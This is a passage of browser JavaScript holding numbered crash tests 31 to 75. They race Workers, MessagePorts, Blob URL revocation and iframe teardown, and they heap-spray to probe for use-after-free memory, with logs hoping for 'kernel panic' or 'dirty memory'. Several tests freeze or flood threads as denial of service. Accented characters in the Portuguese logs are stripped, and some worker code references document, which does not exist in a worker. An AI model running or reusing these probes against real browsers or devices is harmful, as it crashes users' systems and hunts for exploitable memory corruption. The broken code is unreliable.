                    ch.port2.close(); // Close receiver with full queue
                    ch.port1.close();
                    log("SUCCESS: 5000 messages queued, receiver closed.");
                }
            }, 10);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest31() {
        log("Init Test 31: Blob Fetch Race...");
        const huge = new Uint8Array(1024 * 1024 * 10).fill(0xEE); 
        const blob = new Blob([huge]);
        const url = URL.createObjectURL(blob);
        const wCode = `
            onmessage = e => {
                fetch(e.data).then(r => r.arrayBuffer()).then(b => postMessage(b.byteLength));
            };
        `;
        const wUrl = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        try {
            const workers = [];
            for(let i=0; i<10; i++) {
                const w = new Worker(wUrl);
                w.postMessage(url);
                workers.push(w);
            }
            setTimeout(() => {
                URL.revokeObjectURL(url); 
                workers.forEach(w => w.terminate()); 
                log("SUCCESS: URL revoked and workers killed during fetch.");
            }, 50);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest32() {
        log("Init Test 32: Global Storage Event Corruption...");
        const iframes = [];
        try {
            for(let i=0; i<50; i++) {
                const ifr = document.createElement('iframe');
                document.body.appendChild(ifr);
                ifr.contentWindow.onstorage = e => {
                    const x = new Array(1000).fill(1); 
                };
                iframes.push(ifr);
            }
            let k = 0;
            const iv = setInterval(() => {
                localStorage.setItem("key"+k, Date.now());
                if(k % 10 === 0 && iframes.length > 0) {
                    const rem = iframes.pop();
                    document.body.removeChild(rem); 
                }
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCCESS: Storage events fired with removal race.");
                }
            }, 10);
        } catch(e) { log("FAIL: " + e.message); }
    }
function runTest33() {
        log("Init Test 33: Worker GC Race...");
        const code = `self.onmessage=e=>{
            let a=[];
            for(let i=0;i<10000;i++) a.push({id:i, b:new Uint8Array(1024)});
            self.postMessage("ready");
            const buf=new ArrayBuffer(1024*1024);
            const v=new Uint32Array(buf);
            v[0]=0x1337;
            try{self.postMessage(buf,[buf])}catch(x){}
            a=null;
        }`;
        const url = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            for(let i=0; i<20; i++) {
                const w = new Worker(url);
                w.onmessage = e => {
                    if(e.data instanceof ArrayBuffer && e.data.byteLength > 0) log("FAIL: Buffer leakage");
                    w.terminate();
                };
                w.postMessage("go");
                const pressure = new Array(5000).fill(i);
            }
            log("SUCCESS: Workers cycled with heavy allocation.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest34() {
        log("Init Test 34: IPC Ping-Pong Churn...");
        const ch = new MessageChannel();
        let port = ch.port1;
        let count = 0;
        const limit = 200;
        try {
            ch.port2.onmessage = e => {
                const p = e.ports[0];
                if(count++ < limit) {
                    const next = new MessageChannel();
                    p.postMessage("ping", [next.port1]);
                    p.close();
                    ch.port2.postMessage("next", [next.port2]);
                } else {
                    log("SUCCESS: Port churn limit reached.");
                }
            };
            const first = new MessageChannel();
            ch.port2.postMessage("start", [first.port1]);
            first.port2.close();
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest35() {
        log("Init Test 35: Slab Reuse Pressure...");
        const refs = [];
        try {
            const size = 1024 * 128;
            for(let i=0; i<500; i++) {
                const buf = new ArrayBuffer(size);
                const view = new Uint32Array(buf);
                view[0] = 0xDEADBEEF;
                refs.push(buf);
                if(i % 50 === 0) {
                    refs.length = 0; 
                    const junk = new Array(1000).fill(1.1);
                }
            }
            const spray = new ArrayBuffer(size);
            const v = new Uint32Array(spray);
            if(v[0] !== 0) log("SUCCESS: Memory dirty (Possible UAF): " + v[0]);
            else log("SUCCESS: Slab pressure cycle complete.");
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest36() {
        log("Init Test 36: Cross-Context Port...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        const wCode = `self.onmessage=e=>{e.data.postMessage("worker_ack");}`;
        const wUrl = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(wUrl);
        const ch = new MessageChannel();
        try {
            ifr.contentWindow.postMessage("init", "*", [ch.port2]);
            w.postMessage(ch.port1, [ch.port1]);
            setTimeout(() => {
                document.body.removeChild(ifr);
                w.terminate();
                log("SUCCESS: Detached context port transfer executed.");
            }, 100);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest37() {
        log("Init Test 37: Blob Race...");
        const chunks = [new Uint8Array(1024*1024).fill(0xAA)];
        const b = new Blob(chunks);
        const url = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const start=Date.now();
            while(Date.now()-start<100){
                fetch(u).then(r=>r.arrayBuffer()).catch(()=>{});
            }
        }`;
        const wUrl = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const w = new Worker(wUrl);
        try {
            w.postMessage(url);
            let k=0;
            const i=setInterval(()=>{
                if(k++===5) URL.revokeObjectURL(url);
                if(k>20){
                    clearInterval(i);
                    w.terminate();
                    log("SUCCESS: Fetch vs Revoke race finished.");
                }
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest38() {
        log("Init Test 38: Circular Port Ring Panic...");
        const ports = [];
        const size = 50;
        try {
            for(let i=0; i<size; i++) {
                const ch = new MessageChannel();
                ports.push({p1: ch.port1, p2: ch.port2});
            }
            for(let i=0; i<size; i++) {
                const next = (i + 1) % size;
                ports[i].p1.postMessage("link", [ports[next].p1]);
            }
            setTimeout(() => {
                log("Closing ring...");
                for(let i=0; i<size; i++) ports[i].p2.close();
                log("SUCCESS: Ring closed. Watch for Refcount Panic.");
            }, 500);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest39() {
        log("Init Test 39: BroadcastChannel Thread Kill...");
        const name = "bc_panic_" + Math.random();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{while(1);}`;
        const url = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<30; i++) workers.push(new Worker(url));
            const main = new BroadcastChannel(name);
            main.postMessage("freeze");
            setTimeout(() => {
                workers.forEach(w => w.terminate());
                main.close();
                log("SUCCESS: Frozen threads terminated.");
            }, 200);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest40() {
        log("Init Test 40: Scheduler Contention...");
        const child = `setInterval(()=>{Math.random()},1)`;
        const parent = `
            const b=new Blob(["${child}"],{type:'text/javascript'});
            const u=URL.createObjectURL(b);
            const w=[];
            for(let i=0;i<5;i++) w.push(new Worker(u));
            onmessage=()=>{w.forEach(x=>x.terminate());self.close();}
        `;
        const url = URL.createObjectURL(new Blob([parent],{type:'text/javascript'}));
        const roots = [];
        try {
            for(let i=0; i<10; i++) roots.push(new Worker(url));
            setTimeout(() => {
                roots.forEach(r => r.postMessage("die"));
                log("SUCCESS: Nested scheduler tree collapsed.");
            }, 500);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest41() {
        log("Init Test 41: IPC Buffer Exhaustion...");
        const ch = new MessageChannel();
        const buf = new Uint8Array(1024 * 64).fill(0xCC);
        let sent = 0;
        try {
            const i = setInterval(() => {
                for(let k=0; k<20; k++) {
                    ch.port1.postMessage(buf);
                    sent++;
                }
                if(sent > 2000) {
                    clearInterval(i);
                    ch.port2.close();
                    setTimeout(() => {
                        ch.port1.close();
                        log("SUCCESS: Pipe filled and closed.");
                    }, 100);
                }
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }

    function runTest42() {
        log("Init Test 42: Global List Corruption...");
        const frames = [];
        try {
            for(let i=0; i<20; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.onstorage = () => {};
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(() => {
                localStorage.setItem("k"+k, Math.random());
                if(k % 5 === 0 && frames.length > 0) {
                    const r = frames.pop();
                    r.contentWindow.onstorage = null;
                    document.body.removeChild(r);
                }
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCCESS: Global listener list stressed.");
                }
            }, 5);
        } catch(e) { log("FAIL: " + e.message); }
    }
function runTest43() {
        log("Init Test 43: Worker GC Graph Race...");
        const code = `self.onmessage=e=>{
            let root={};
            let curr=root;
            for(let i=0;i<20000;i++){
                curr.next={parent:curr, val:new Uint8Array(1024), id:i};
                curr=curr.next;
            }
            self.postMessage("built");
            while(true){
                let t=root;
                while(t){t.val[0]=1;t=t.next;}
            }
        }`;
        const url = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            const workers = [];
            for(let i=0; i<15; i++) {
                const w = new Worker(url);
                w.onmessage = () => {
                    setTimeout(() => w.terminate(), Math.random() * 10);
                };
                w.postMessage("start");
                workers.push(w);
            }
            const spray = new Uint32Array(1024*1024*20); 
            spray.fill(0x41414141);
            log("SUCESSO: Race condition disparada com GC pressure.");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest44() {
        log("Init Test 44: Recursive Port Neuter...");
        const ch = new MessageChannel();
        let p = ch.port1;
        const buf = new ArrayBuffer(1024*64);
        try {
            const depth = 500;
            for(let i=0; i<depth; i++) {
                const next = new MessageChannel();
                p.postMessage({idx: i, buf: buf}, [buf, next.port1]); 
                if(buf.byteLength > 0) { log("FALHA: Buffer no neutered em " + i); break; }
                p = next.port2;
            }
            ch.port2.onmessage = e => {
                log("SUCESSO: Cadeia de transferncia completada sem crash.");
            };
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest45() {
        log("Init Test 45: Blob URI Revoke Race...");
        const chunks = [];
        for(let i=0; i<100; i++) chunks.push(new Uint8Array(1024).fill(i));
        const b = new Blob(chunks);
        const url = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            let k=0;
            const i=setInterval(()=>{
                fetch(u).then(r=>r.arrayBuffer()).then(ab=>postMessage(ab.byteLength)).catch(()=>{});
                if(k++>100) clearInterval(i);
            },1);
        }`;
        const wUrl = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            const w = new Worker(wUrl);
            w.postMessage(url);
            let k=0;
            const iv = setInterval(()=>{
                if(k===10) URL.revokeObjectURL(url);
                if(k===12) w.terminate();
                if(k++>20) {
                    clearInterval(iv);
                    log("SUCESSO: Race entre Fetch, Revoke e Terminate executada.");
                }
            }, 10);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest46() {
        log("Init Test 46: Map Iterator UAF...");
        const m = new Map();
        const kSize = 10000;
        for(let i=0; i<kSize; i++) m.set({id:i}, new Uint8Array(128));
        const iter = m.entries();
        iter.next();
        try {
            m.clear();
            const spray = [];
            for(let i=0; i<kSize; i++) spray.push({a:0x1337, b:0xDEAD}); 
            const res = iter.next();
            if(!res.done && res.value) {
                log("SUCESSO: Iterator leu memria suja: " + res.value);
            } else {
                log("SUCESSO: Iterator seguro ou crash evitado.");
            }
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest47() {
        log("Init Test 47: Port Entanglement & Iframe Destruct...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const ch1 = new MessageChannel();
        const ch2 = new MessageChannel();
        try {
            f.contentWindow.postMessage("init", "*", [ch1.port2]);
            ch1.port1.postMessage("entangle", [ch2.port2]);
            let k=0;
            const i=setInterval(()=>{
                ch2.port1.postMessage({payload: new Array(100).fill(k)});
                if(k===10) document.body.removeChild(f);
                if(k++>50) {
                    clearInterval(i);
                    ch1.port1.close();
                    ch2.port1.close();
                    log("SUCESSO: Portas estressadas durante destruio de contexto.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest48() {
        log("Init Test 48: BroadcastChannel Scheduler Panic...");
        const name = "panic_" + Date.now();
        const code = `const bc=new BroadcastChannel('${name}');onmessage=()=>{bc.postMessage(new Uint8Array(1024*64));}`;
        const url = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<60; i++) workers.push(new Worker(url));
            const bc = new BroadcastChannel(name);
            let counts = 0;
            bc.onmessage = () => {
                if(counts++ > 500) {
                    workers.forEach(w => w.terminate());
                    bc.close();
                    log("SUCESSO: Scheduler saturado e threads mortas.");
                }
            };
            workers.forEach(w => w.postMessage("go"));
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest49() {
        log("Init Test 49: Circular IPC Refcount Panic...");
        const chA = new MessageChannel();
        const chB = new MessageChannel();
        const chC = new MessageChannel();
        try {
            chA.port1.postMessage("cycle", [chB.port1]);
            chB.port2.postMessage("cycle", [chC.port1]);
            chC.port2.postMessage("cycle", [chA.port2]);
            const killer = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{e.data.close()}"],{type:'text/javascript'})));
            killer.postMessage(chA.port1, [chA.port1]); 
            setTimeout(() => {
                killer.terminate();
                chB.port2.close();
                chC.port2.close();
                log("SUCESSO: Ciclo de refcount rfo criado no Kernel.");
            }, 200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest50() {
        log("Init Test 50: Global Storage Event Panic...");
        const wins = [];
        try {
            for(let i=0; i<40; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                wins.push(f);
                f.contentWindow.addEventListener('storage', ()=>{ 
                    const x = new Float64Array(1000); 
                    Math.sin(x[0]);
                });
            }
            let k=0;
            const iv=setInterval(()=>{
                localStorage.setItem("flood"+k, Date.now());
                if(k%5===0 && wins.length>0) {
                    const r=wins.pop();
                    document.body.removeChild(r);
                }
                if(k++>200) {
                    clearInterval(iv);
                    log("SUCESSO: Lista global de eventos estressada.");
                }
            }, 2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest51() {
        log("Init Test 51: Nested Proc Cleanup Race...");
        const child = `setInterval(()=>{postMessage(new ArrayBuffer(1024))},1)`;
        const parent = `
            const b=new Blob(["${child}"],{type:'text/javascript'});
            const u=URL.createObjectURL(b);
            const w=[];
            for(let i=0;i<5;i++) w.push(new Worker(u));
            onmessage=()=>{w.forEach(x=>x.terminate());self.close();}
        `;
        const url = URL.createObjectURL(new Blob([parent],{type:'text/javascript'}));
        const roots = [];
        try {
            for(let i=0; i<15; i++) roots.push(new Worker(url));
            setTimeout(() => {
                roots.forEach(r => r.postMessage("die"));
                log("SUCESSO: rvore de processos colapsada simultaneamente.");
            }, 600);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest52() {
        log("Init Test 52: File Descriptor Exhaustion...");
        const blob = new Blob([new Uint8Array(1024*1024*2).fill(0xFE)]);
        const readers = [];
        const limit = 2500;
        try {
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(blob);
                readers.push(fr);
                if(i % 500 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate(); 
                }
            }
            log("SUCESSO: " + limit + " FileReaders + Worker churn disparados.");
        } catch(e) { log("FALHA: " + e.message); }
    }
function runTest53() {
        log("Init Test 53: Worker Chain Race...");
        const code = `self.onmessage=e=>{
            const {p,id}=e.data;
            const buf=new Uint8Array(1024*1024);
            buf.fill(id);
            if(p){
                try{p.postMessage({p:null,id:id+1,buf:buf},[buf.buffer,p]);}catch(x){}
            }else{
                self.close();
            }
        }`;
        const url = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            let lastPort = null;
            const workers = [];
            for(let i=0; i<30; i++) {
                const ch = new MessageChannel();
                const w = new Worker(url);
                w.postMessage({p: lastPort, id: i}, [lastPort].filter(x=>x));
                lastPort = ch.port2;
                workers.push(w);
                if(i % 5 === 0) workers[Math.floor(Math.random()*workers.length)].terminate();
            }
            log("SUCESSO: Cadeia de workers fragmentada.");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest54() {
        log("Init Test 54: Deep Nested Port...");
        const ch = new MessageChannel();
        let payload = { port: ch.port1 };
        try {
            for(let i=0; i<500; i++) {
                const next = new MessageChannel();
                payload = { next: payload, p: next.port1 };
                if(i===499) payload.end = ch.port2;
            }
            const w = new Worker(URL.createObjectURL(new Blob([`onmessage=e=>{postMessage("done")}`],{type:'text/javascript'})));
            const transfer = [];
            let t = payload;
            while(t) { if(t.p) transfer.push(t.p); if(t.port) transfer.push(t.port); if(t.end) transfer.push(t.end); t = t.next; }
            w.postMessage(payload, transfer);
            log("SUCESSO: Objeto profundamente aninhado enviado.");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest55() {
        log("Init Test 55: Array.from Iterator Neuter...");
        const src = new Uint8Array(1024 * 1024 * 5);
        src.fill(0xAA);
        const iter = {
            [Symbol.iterator]() {
                let i = 0;
                return {
                    next() {
                        if (i === 5) {
                            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                            w.postMessage(src.buffer, [src.buffer]);
                        }
                        return { value: src[i++], done: i > 100 };
                    }
                };
            }
        };
        try {
            const res = Array.from(iter);
            if(res.length > 5 && res[6] === undefined) log("SUCESSO: Leitura em buffer neutered detectada.");
            else log("SUCESSO: Iterao completada (seguro).");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest56() {
        log("Init Test 56: Iframe Nav Detachment...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const ch = new MessageChannel();
        let k = 0;
        try {
            f.contentWindow.postMessage("init", "*", [ch.port2]);
            const i = setInterval(() => {
                ch.port1.postMessage({data: new Array(1000).fill(k)});
                if(k === 10) f.src = "about:blank";
                if(k === 15) document.body.removeChild(f);
                if(k++ > 50) {
                    clearInterval(i);
                    log("SUCESSO: Portas estressadas durante navegao.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest57() {
        log("Init Test 57: Blob URL Timing Attack...");
        const b = new Blob([new Uint8Array(1024*1024).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=async e=>{
            const u=e.data;
            const start=Date.now();
            while(Date.now()-start<200){
                try{await fetch(u)}catch(x){}
            }
            postMessage("done");
        }`;
        const w = new Worker(URL.createObjectURL(new Blob([wCode],{type:'text/javascript'})));
        try {
            w.postMessage(u);
            setTimeout(() => URL.revokeObjectURL(u), 50);
            setTimeout(() => w.terminate(), 60);
            log("SUCESSO: Fetch/Revoke/Terminate race iniciada.");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest58() {
        log("Init Test 58: Ring Refcount Panic...");
        const ring = [];
        const size = 100;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i+1)%size;
                ring[i].port1.postMessage("L", [ring[next].port1]);
            }
            const randClose = setInterval(() => {
                const idx = Math.floor(Math.random()*size);
                try { ring[idx].port2.close(); } catch(e){}
                if(Math.random()>0.9) {
                    clearInterval(randClose);
                    log("SUCESSO: Anel de portas desestabilizado.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest59() {
        log("Init Test 59: Scheduler Spinlock...");
        const spin = `onmessage=()=>{const e=Date.now()+1000;while(Date.now()<e){Math.random()}}`;
        const u = URL.createObjectURL(new Blob([spin],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<12; i++) ws.push(new Worker(u));
            ws.forEach(w => w.postMessage("spin"));
            setTimeout(() => {
                ws.forEach(w => w.terminate());
                log("SUCESSO: Threads em spinlock terminadas.");
            }, 500);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest60() {
        log("Init Test 60: Broadcast Name Collision...");
        const name = "collide_" + Date.now();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{bc.postMessage(new ArrayBuffer(1024))}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<50; i++) ws.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            bc.postMessage("start");
            setTimeout(() => {
                ws.forEach(w => w.terminate());
                bc.close();
                log("SUCESSO: Coliso global de nomes estressada.");
            }, 200);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest61() {
        log("Init Test 61: Recursive Process Depth...");
        const code = `self.onmessage=e=>{
            if(e.data>0){
                const w=new Worker(URL.createObjectURL(new Blob([document.getElementById('recScript').textContent],{type:'text/javascript'})));
                w.postMessage(e.data-1);
            }else{
                while(true);
            }
        }`;
        // Self-replicating Blob trick
        const blobContent = `self.onmessage=e=>{if(e.data>0){const w=new Worker(self.location.href);w.postMessage(e.data-1)}else{const b=new Uint8Array(1024*1024);while(1)Math.sin(0)}}`;
        const u = URL.createObjectURL(new Blob([blobContent],{type:'text/javascript'}));
        try {
            const root = new Worker(u);
            root.postMessage(20); 
            setTimeout(() => {
                root.terminate();
                log("SUCESSO: rvore recursiva terminada abruptamente.");
            }, 1000);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest62() {
        log("Init Test 62: Pipe Fill & Close Race...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 16).fill(0xFF);
        let count = 0;
        try {
            const i = setInterval(() => {
                for(let k=0; k<50; k++) {
                    ch.port1.postMessage(payload);
                    count++;
                }
                if(count > 4000) {
                    clearInterval(i);
                    ch.port2.close(); 
                    setTimeout(() => ch.port1.close(), 10);
                    log("SUCESSO: Pipe kernel saturado e fechado.");
                }
            }, 2);
        } catch(e) { log("FALHA: " + e.message); }
    }
function runTest63() {
        log("Init Test 63: Worker Circular Ref GC...");
        const code = `self.onmessage=e=>{
            let roots=[];
            for(let i=0;i<1000;i++){
                let o={id:i, buf:new Uint8Array(1024)};
                o.self=o;
                o.next={parent:o};
                roots.push(o);
            }
            self.postMessage("loaded");
            const b=new ArrayBuffer(1024*1024*2);
            while(true){
                if(roots.length>0) roots.pop();
                try{self.postMessage(b,[b])}catch(x){}
            }
        }`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        try {
            const workers = [];
            for(let i=0; i<15; i++) {
                const w = new Worker(u);
                w.onmessage = () => w.terminate();
                w.postMessage("start");
                workers.push(w);
            }
            setTimeout(() => {
                const spray = new Uint32Array(1024*1024*10); 
                spray.fill(0xDEADBEEF);
                log("SUCESSO: Workers terminados com referncia circular ativa.");
            }, 500);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest64() {
        log("Init Test 64: Nested Port Chain...");
        const root = new MessageChannel();
        let curr = root.port1;
        const depth = 1000;
        try {
            for(let i=0; i<depth; i++) {
                const next = new MessageChannel();
                curr.postMessage({idx:i}, [next.port1]);
                curr = next.port2;
            }
            const drain = (p, c) => {
                p.onmessage = e => {
                    if(c < depth) drain(e.ports[0], c+1);
                    else log("SUCESSO: Cadeia de " + depth + " portas drenada.");
                };
            };
            drain(root.port2, 0);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest65() {
        log("Init Test 65: History Slab Flood...");
        const trash = [];
        try {
            let k = 0;
            const i = setInterval(() => {
                const b = new Uint8Array(1024 * 128); 
                b.fill(k % 255);
                try {
                    history.pushState(b, "id"+k, null);
                    trash.push(history.state);
                    if(trash.length > 50) trash.shift();
                } catch(e) {
                    const clean = new ArrayBuffer(1024*1024);
                }
                if(k++ > 200) {
                    clearInterval(i);
                    log("SUCESSO: Alocador do histrico estressado.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest66() {
        log("Init Test 66: Detached Iframe Zombie...");
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        const ch = new MessageChannel();
        try {
            f.contentWindow.postMessage("init", "*", [ch.port2]);
            const p = ch.port1;
            let count = 0;
            const i = setInterval(() => {
                p.postMessage({data: new Uint8Array(2048).fill(0xAA)});
                if(count === 20) document.body.removeChild(f);
                if(count++ > 100) {
                    clearInterval(i);
                    p.close();
                    log("SUCESSO: Mensagens enviadas para contexto morto.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest67() {
        log("Init Test 67: Blob VFS Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*5).fill(0xFF)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const s=Date.now();
            while(Date.now()-s<500){
                fetch(u).then(r=>r.arrayBuffer()).then(b=>postMessage(b.byteLength)).catch(()=>{});
            }
        }`;
        const wUrl = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            const workers = [];
            for(let i=0; i<8; i++) {
                const w = new Worker(wUrl);
                w.postMessage(u);
                workers.push(w);
            }
            setTimeout(() => {
                URL.revokeObjectURL(u);
                workers.forEach(w => w.terminate());
                log("SUCESSO: Race condition em handles VFS executada.");
            }, 100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest68() {
        log("Init Test 68: Recursive IPC Refcount Panic...");
        const wCode = `self.onmessage=e=>{
            const p=e.data;
            p.postMessage("loop",[p]); 
            self.close();
        }`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            for(let i=0; i<40; i++) {
                const ch = new MessageChannel();
                const w = new Worker(u);
                w.postMessage(ch.port1, [ch.port1]); 
                // Port1 entra no worker, worker tenta enviar Port1 de volta para Port1 (impossvel/falha) e morre.
                // O kernel tenta decrementar refs de uma porta que pode estar em trnsito recursivo.
            }
            log("SUCESSO: Loops de porta em threads moribundas criados.");
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest69() {
        log("Init Test 69: Broadcast Herd Kill...");
        const name = "herd_" + Math.random();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{while(true);}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<50; i++) workers.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            bc.postMessage("wakeup");
            setTimeout(() => {
                // Mata todos enquanto tentam acordar (wakeups pendentes no scheduler)
                workers.forEach(w => w.terminate());
                bc.close();
                log("SUCESSO: Thundering herd eliminada durante wakeup.");
            }, 100);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest70() {
        log("Init Test 70: Pipe Buffer Exhaustion...");
        const ch = new MessageChannel();
        const load = new Uint8Array(1024 * 32).fill(0xBB);
        try {
            let sent = 0;
            const i = setInterval(() => {
                for(let k=0; k<100; k++) {
                    ch.port1.postMessage(load);
                    sent++;
                }
                if(sent > 3000) {
                    clearInterval(i);
                    ch.port2.close(); // Fecha leitura com buffer cheio
                    setTimeout(() => ch.port1.close(), 50); // Fecha escrita depois
                    log("SUCESSO: Buffer IPC saturado e fechado assincronamente.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest71() {
        log("Init Test 71: Storage Listener Corruption...");
        const frames = [];
        try {
            for(let i=0; i<30; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.addEventListener('storage', () => {
                    const tmp = new Uint8Array(1000); // Noise
                });
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(() => {
                localStorage.setItem("r"+k, Math.random());
                if(k % 3 === 0 && frames.length > 0) {
                    const r = frames.splice(Math.floor(Math.random()*frames.length), 1)[0];
                    document.body.removeChild(r);
                }
                if(k++ > 150) {
                    clearInterval(iv);
                    log("SUCESSO: Lista global de eventos storage corrompida.");
                }
            }, 5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest72() {
        log("Init Test 72: VFS Table Thrashing...");
        const b = new Blob([new Uint8Array(1024*1024).fill(0x00)]);
        const readers = [];
        try {
            for(let i=0; i<2000; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(0, 1024));
                readers.push(fr);
                if(i % 200 === 0) {
                    // Cria presso no scheduler
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: 2000 leituras VFS concorrentes disparadas.");
        } catch(e) { log("FALHA: " + e.message); }
    }
 function runTest73() {
        log("Init Test 73: Recursive Worker Terminate Race...");
        const code = `self.onmessage=e=>{
            if(e.data.d>0){
                const w=new Worker(URL.createObjectURL(new Blob([document.getElementById('w73').textContent],{type:'text/javascript'})));
                w.postMessage({d:e.data.d-1});
                const b=new ArrayBuffer(1024*1024);
                try{w.postMessage(b,[b])}catch(x){}
                setTimeout(()=>w.terminate(),10);
            } else {
                setInterval(()=>{try{self.postMessage(new ArrayBuffer(1024))}catch(x){}},5);
            }
        }`;
        // Self-injecting blob
        const b = new Blob([code.replace("document.getElementById('w73').textContent", "`"+code+"`")], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        try {
            const roots = [];
            for(let i=0; i<10; i++) {
                const w = new Worker(u);
                w.postMessage({d: 5});
                roots.push(w);
            }
            setTimeout(() => {
                roots.forEach(w => w.terminate());
                log("SUCESSO: rvore de workers colapsada com transferncias pendentes.");
            }, 800);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest74() {
        log("Init Test 74: Deep Port Chain Neuter...");
        const ch = new MessageChannel();
        let curr = ch.port1;
        const depth = 2000;
        const chain = [];
        try {
            for(let i=0; i<depth; i++) {
                const next = new MessageChannel();
                chain.push(curr);
                curr.postMessage({i:i}, [next.port1]);
                curr = next.port2;
            }
            log("Chain built. Triggering random closures...");
            let k = 0;
            const iv = setInterval(() => {
                const idx = Math.floor(Math.random() * chain.length);
                try { chain[idx].close(); } catch(e){}
                if(k++ > 500) {
                    clearInterval(iv);
                    ch.port2.close();
                    log("SUCESSO: Cadeia IPC destruda aleatoriamente.");
                }
            }, 1);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest75() {
        log("Init Test 75: Swiss Cheese Heap Spray...");
        const keep = [];
        try {
            let k = 0;
            const iv = setInterval(() => {
                const temp = [];
                for(let i=0; i<100; i++) {
                    const b = new ArrayBuffer(1024 * 64);
                    const v = new Uint32Array(b);
                    v[0] = 0x13371337;
                    temp.push(b);
                }
                // Fragmenta heap liberando intercalados
                for(let i=0; i<100; i+=2) {
